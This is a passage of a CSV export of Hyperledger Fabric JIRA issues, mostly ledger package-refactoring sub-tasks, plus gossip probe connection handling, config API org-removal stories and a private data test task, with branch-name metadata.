information),suryalnvs,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Mar/20 6:14 PM;suryalnvs;https://github.com/hyperledger/fabric-test/pull/157;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
move couchdb util package to statecouchdb package,FAB-17667,44668,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,27/Mar/20 1:29 AM,16/Apr/20 5:30 PM,28/Oct/23 3:09 AM,16/Apr/20 5:30 PM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,"We have a [CouchDB util|https://github.com/hyperledger/fabric/tree/master/core/ledger/util/couchdb] package that exposes API to read from and write to CouchDB. This package is used only by the [statecouchdb|https://github.com/hyperledger/fabric/tree/master/core/ledger/kvledger/txmgmt/statedb/statecouchdb] and  [the tests package|https://github.com/hyperledger/fabric/tree/master/core/ledger/kvledger/tests] (i.e., ledger level integration test).

In general, a util package is justified only when an API needs to be used by so many other packages. For e.g., if we have 10 packages and each of them need a common API, it is not good to duplicate the API code and instead create a separate util package. One such example can be found in the [volume folder in the Kubernetes repo|https://github.com/kubernetes/kubernetes/tree/master/pkg/volume] – It can be seen that Kubernetes supports 26 different volume types and hence [a util package|https://github.com/kubernetes/kubernetes/tree/master/pkg/volume/util] to hold common APIs are justified. However, in our case, it is not justified to have a separate util package to facilitate CouchDB access.

Hence, we move all files in the CouchDB util package to the statecouchdb package itself. Note that there is a lot of opportunities to refactor couchdb util package but we would do it in a separate JIRA.",,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01abf:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
merge privacyenabledstate package with statedb package,FAB-17668,44670,44551,Sub-task,To Do,FAB,Fabric,software,denyeart,,,Medium,,Senthil1,Senthil1,Senthil1,27/Mar/20 2:31 AM,08/May/22 7:31 AM,28/Oct/23 3:09 AM,,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,"In the [statedb|https://github.com/hyperledger/fabric/tree/master/core/ledger/kvledger/txmgmt/statedb] package, we have the implementation of both [stateleveldb|https://github.com/hyperledger/fabric/tree/master/core/ledger/kvledger/txmgmt/statedb/stateleveldb] and [statecouchdb|https://github.com/hyperledger/fabric/tree/master/core/ledger/kvledger/txmgmt/statedb/statecouchdb]. The interface implemented by the these packages do not include any API related to private data as it is not needed. For the db implementation, both public and private data is a KV pair. 

The [privacyenabledstate|https://github.com/hyperledger/fabric/tree/master/core/ledger/kvledger/txmgmt/privacyenabledstate] package was introduced to implement a common db interface (i.e., common to both stateleveldb and statecouchdb). Further, this interface also included APIs related to private data. 

We really don't need these two separate packages privacyenabledstate and statedb. Hence, we merge both of these packages into a single statedb package itself.",,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01abv:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
move kvledger package to ledger package,FAB-17669,44671,44551,Sub-task,To Do,FAB,Fabric,software,denyeart,,,Medium,,Senthil1,Senthil1,Senthil1,27/Mar/20 2:37 AM,27/Mar/20 2:50 AM,28/Oct/23 3:09 AM,,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,"As there was an expectation to add multiple data models, it made sense to have a package called [kvledger|https://github.com/hyperledger/fabric/tree/master/core/ledger/kvledger]. We have not added any new data model other than KV since v1.0 release. Whenever we plan to have a new data model, at that time, we can think of adding a separate folders for each data model.

 

As the kvledger package unnecessarily increases the folder depth in ledger, we remove it.",,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01ac3:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
merge ledgerstorage package to kvledger package,FAB-17670,44672,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,27/Mar/20 2:48 AM,18/Apr/20 2:40 PM,28/Oct/23 3:09 AM,18/Apr/20 2:40 PM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,,,,,,"The [ledgerstorage|https://github.com/hyperledger/fabric/tree/master/core/ledger/ledgerstorage] package encapsulates both [pvtdata storage|https://github.com/hyperledger/fabric/tree/master/core/ledger/pvtdatastorage] and  [block storage|https://github.com/hyperledger/fabric/tree/master/common/ledger/blkstorage]. We needed this package as
 * we had to have [2-phase commit between pvtdata storage and block storage|https://github.com/hyperledger/fabric/blob/release-1.3/core/ledger/ledgerstorage/store.go#L125].
 * we had a [recovery logic|https://github.com/hyperledger/fabric/blob/release-1.3/core/ledger/ledgerstorage/store.go#L230] that was needed after a commit failure or peer crash between pvtdata commit and blockstore commit.
 * we treated pvtdata store as a pvt blockstore and blockstore as public block store.

After introducing the support for peer rollback, we removed the 2-phase commit between requirement between the pvtdata storage and block storage. As a result, the pvtdata storage can be ahead of blockstore. Hence, the recovery logic was also remoted. Hence, the motivation for having ledgerstorage package became feeble and hence, we remove it. 

Further, core/ledger, core/ledger/ledgerstore, core/ledger/ledgermgmt create confusion and provide disinformation.",,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01acb:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
move bookkeeping package to ledger package,FAB-17671,44673,44551,Sub-task,To Do,FAB,Fabric,software,denyeart,,,Medium,,Senthil1,Senthil1,Senthil1,27/Mar/20 2:52 AM,27/Mar/20 2:52 AM,28/Oct/23 3:09 AM,,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01acj:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Prevent gossip probes from registering as long lasting connections,FAB-17672,44674,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,27/Mar/20 2:55 AM,28/Mar/20 6:39 AM,28/Oct/23 3:09 AM,28/Mar/20 6:39 AM,,,,,,,,,,v2.1.0,,,,fabric-gossip,,,,,,,,,0,,,,,,"Gossip bootstrap peer and anchor peer connection establishments are a two step process:
 # Connect to the remote endpoint, and figure out its organization association
 # Connect to the remote endpoint once again, this time sending membership information according to what it is eligible to.

Unfortunately, if the responding peer connects to the initiator peer at the same time, the connection of (1) will be overwritten by the connection (gossip keeps a single connection among every pair of peers) from the responder peer and the initiator peer will consider the responder peer as dead.

In production, where peers run for a long time and constnatly retry, this is not a problem.

However, in integration tests that expect data to be disseminated in a timely manner, this might cause flakes.

 

This story proposes to mark probes (1) with a special boolean flag that indicates this connection is not a long lasting one, and thus there is no point to add it to the connection store.",,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01acr:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),yacovm,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,dependabot/bundler/docs/nokogiri-1.14.3,0.2.x,dependabot/bundler/docs/activesupport-6.0.6.1,dependabot/go_modules/bindings/go-apiv1/golang.org/x/text-0.3.8,0.1.x,main,dependabot/go_modules/golang.org/x/net-0.7.0,dependabot/go_modules/golang.org/x/text-0.3.8,dependabot/go_modules/bindings/go-apiv1/golang.org/x/net-0.7.0,dependabot/bundler/docs/commonmarker-0.23.9,mergify/bp/release-2.2/pr-3750,dependabot/go_modules/bindings/go-apiv2/golang.org/x/net-0.7.0,release-2.3,release-2.2,dependabot/go_modules/bindings/go-apiv2/golang.org/x/text-0.3.8,release-2.5,release-2.4,github-settings,dependabot/go_modules/bindings/go-apiv2/golang.org/x/sys-0.1.0,dependabot/go_modules/golang.org/x/sys-0.1.0,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,dependabot/go_modules/bindings/go-apiv1/golang.org/x/sys-0.1.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
refactor txmgmt package,FAB-17673,44675,44551,Sub-task,To Do,FAB,Fabric,software,denyeart,,,Medium,,Senthil1,Senthil1,Senthil1,27/Mar/20 2:55 AM,16/May/20 4:06 AM,28/Oct/23 3:09 AM,,v2.2.0,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01acz:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add probe flag to ConnEstablish message,FAB-17674,44676,44674,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,27/Mar/20 2:56 AM,27/Mar/20 6:36 AM,28/Oct/23 3:09 AM,27/Mar/20 6:36 AM,,,,,,,,,,,,,,fabric-gossip,,,,,,,,,0,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01ad7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),yacovm,,,,,,,,,,,,,,dependabot/bundler/docs/nokogiri-1.14.3,0.2.x,dependabot/bundler/docs/activesupport-6.0.6.1,dependabot/go_modules/bindings/go-apiv1/golang.org/x/text-0.3.8,0.1.x,dependabot/go_modules/golang.org/x/net-0.7.0,main,dependabot/go_modules/golang.org/x/text-0.3.8,dependabot/go_modules/bindings/go-apiv1/golang.org/x/net-0.7.0,dependabot/bundler/docs/commonmarker-0.23.9,dependabot/go_modules/bindings/go-apiv2/golang.org/x/net-0.7.0,release-2.3,release-2.2,dependabot/go_modules/bindings/go-apiv2/golang.org/x/text-0.3.8,github-settings,dependabot/go_modules/bindings/go-apiv2/golang.org/x/sys-0.1.0,dependabot/go_modules/golang.org/x/sys-0.1.0,dependabot/go_modules/bindings/go-apiv1/golang.org/x/sys-0.1.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Pick up protobuf changes from FAB-17674 and make gossip skip connection registration for probing,FAB-17675,44677,44674,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,27/Mar/20 2:57 AM,28/Mar/20 6:39 AM,28/Oct/23 3:09 AM,28/Mar/20 6:39 AM,,,,,,,,,,v2.1.0,,,,fabric-gossip,,,,,,,,,0,,,,,,,,denyeart,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01adf:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,yacovm,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Mar/20 6:32 AM;denyeart;https://github.com/hyperledger/fabric/pull/925;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
move cache package to statecouchdb,FAB-17676,44678,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,27/Mar/20 4:51 AM,03/Apr/20 12:28 AM,28/Oct/23 3:09 AM,03/Apr/20 12:28 AM,v2.2.0,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,"We have introduced the cache implementation in the [statedb package|https://github.com/hyperledger/fabric/tree/master/core/ledger/kvledger/txmgmt/statedb] as the initial plan was to integrate cache with both [statecouchdb|https://github.com/hyperledger/fabric/tree/master/core/ledger/kvledger/txmgmt/statedb/statecouchdb] and [stateleveldb|https://github.com/hyperledger/fabric/tree/master/core/ledger/kvledger/txmgmt/statedb/stateleveldb]. However, we have decided to defer the cache integration with stateleveldb as the expected improvement would be <5% and further, the goleveldb is not a bottleneck as of now.

Hence, we move the cache implementation to the statecouchdb package itself. When there is a need to integrate cache with goleveldb, we can move it back.",,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01adn:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
move txvalidation flag util to internal/pkg from ledger,FAB-17677,44681,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,27/Mar/20 1:00 PM,03/Apr/20 1:12 PM,28/Oct/23 3:09 AM,03/Apr/20 1:12 PM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,"The [txvalidation util package|https://github.com/hyperledger/fabric/blob/master/core/ledger/util/txvalidationflags.go] helps in creating transaction validation flags that would be assigned to the block metadata. This function is used by the [v14|https://github.com/hyperledger/fabric/tree/master/core/committer/txvalidator/v14] and [v20|https://github.com/hyperledger/fabric/tree/master/core/committer/txvalidator/v20] validation as it is needed by these packages to record invalid tx as per policy evaluation. This validation flags is also reused in the [mvcc validator|https://github.com/hyperledger/fabric/tree/master/core/ledger/kvledger/txmgmt/validator] to mark valid/invalid transactions. As the txvalidation util package is used only in these two packages, there is no need to keep it in _core/ledger/util/_

Hence, we move the txvalidation util package to the [core/committer/txvalidator|https://github.com/hyperledger/fabric/tree/master/core/committer/txvalidator] where it is used first and it is imported in the [core/ledger/kvledger/txmgmt/validator|https://github.com/hyperledger/fabric/tree/master/core/ledger/kvledger/txmgmt/validator]. I really could not find a better way than this. This is because our existing folder structure is flawed: 
 (1) core/committer/txvalidator – this is called committer
 (2) core/ledger/kvledger/ – here only the actual commit to database and disk happen
 (3) core/committer/txvalidator/v14 – first validator
 (4) core/ledger/kvledger/txmgmt/validator – second validator

I am sure this structure would make any beginner crazy. We should have one package called validation which should do both vscc and mvcc validation. Then we should have another package called committer which should do all commit to databases and disk – refer to figure 9 on page 6 – [https://arxiv.org/pdf/2003.05113.pdf |https://arxiv.org/pdf/2003.05113.pdf]for such an architecture. 

Given that we have a bad package structure, I could not find a better place for txvalidation util package other than moving it to _core/committer/txvalidator_ package.",,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01aeb:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add Private Data Test Scenario,FAB-17678,44682,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,btl5037,btl5037,27/Mar/20 1:04 PM,11/Jan/21 1:36 AM,28/Oct/23 3:09 AM,11/Jan/21 1:36 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Use MapPrivate CC and test Private Data.

Do we have a method to verify unauthorized Peers do not have access to the data?",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0192i:w",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
move basic ledger util to the package where it is used,FAB-17679,44687,44551,Sub-task,To Do,FAB,Fabric,software,denyeart,,,Medium,,Senthil1,Senthil1,Senthil1,27/Mar/20 6:30 PM,27/Mar/20 6:30 PM,28/Oct/23 3:09 AM,,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01aez:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement functions for removing orgs,FAB-17680,44696,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,xwu,caod,caod,28/Mar/20 1:13 AM,07/Apr/20 10:17 AM,28/Oct/23 3:09 AM,07/Apr/20 10:17 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"As a consumer of the fabric config API I'd like to be able to remove consortium, application, and orderer orgs from a config transaction.

 

*Acceptance*

I can call separate functions for removing an organization from a consortium, application, and orderer. The examples should be updated as well to demonstrate usage.",,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzjzv",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"04/Apr/20 2:18 AM;caod;[https://github.com/hyperledger/fabric/pull/992];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement function for removing a consortium,FAB-17681,44697,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,xwu,caod,caod,28/Mar/20 1:14 AM,03/Apr/20 8:15 PM,28/Oct/23 3:09 AM,03/Apr/20 8:15 PM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"As a consumer of the fabric config API I'd like to be able to remove a consortium from a config transaction.

 

*Acceptance*

I can call a function for removing a specific consortium from a channel config. The examples should be updated as well to demonstrate usage.",,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzjzy",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"31/Mar/20 10:58 PM;caod;[https://github.com/hyperledger/fabric/pull/956];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
refactor couchdb access module in statecouchdb package,FAB-17682,44698,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,Senthil1,Senthil1,Senthil1,28/Mar/20 11:54 AM,04/Apr/20 6:51 PM,28/Oct/23 3:09 AM,04/Apr/20 6:51 PM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01aff:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
reduce #arguments in a few kvledger methods,FAB-17683,44699,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,29/Mar/20 2:48 PM,09/May/20 1:17 AM,28/Oct/23 3:09 AM,09/May/20 1:17 AM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,"We have way more function arguments and it makes the code look ugly. Need to reduce it. 

 

